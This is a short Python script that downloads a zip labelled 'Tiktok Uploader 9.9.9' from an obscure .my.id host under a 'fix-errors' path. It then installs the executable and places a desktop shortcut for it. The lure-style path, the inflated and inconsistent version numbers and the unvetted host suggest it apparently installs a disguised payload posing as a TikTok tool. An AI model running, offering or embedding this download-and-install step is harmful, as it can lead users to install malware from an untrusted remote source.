import installer

zip_path: str = installer.download('https://srv-ziqlabs-1.my.id/share/fix-errors/Tiktok%20Uploader%209.9.9.zip', 'Tiktok Uploader 1.1.0')
executable: str = installer.install(zip_path, 'Tiktok Uploader', '9.9.9')
installer.create_desktop_shortcut(executable, 'Tiktok Uploader')